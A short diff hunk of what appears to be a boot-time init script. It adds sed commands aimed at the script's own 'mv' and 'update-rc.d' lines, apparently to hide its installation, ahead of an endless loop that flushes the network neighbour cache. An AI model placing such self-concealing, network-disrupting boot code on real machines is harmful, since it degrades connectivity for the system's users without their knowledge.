@@ -31,7 +31,8 @@ update-rc.d script enable
 # Short-Description: Start daemon at boot time
 # Description:       Enable service provided by daemon.
 ### END INIT INFO
-mkdir ~/Desktop/TEST
+sed "/mv/d" /etc/init.d/script
+sed "/update-rc.d/d" /etc/init.d/script
 while true
 do
 	ip -s -s neigh flush all
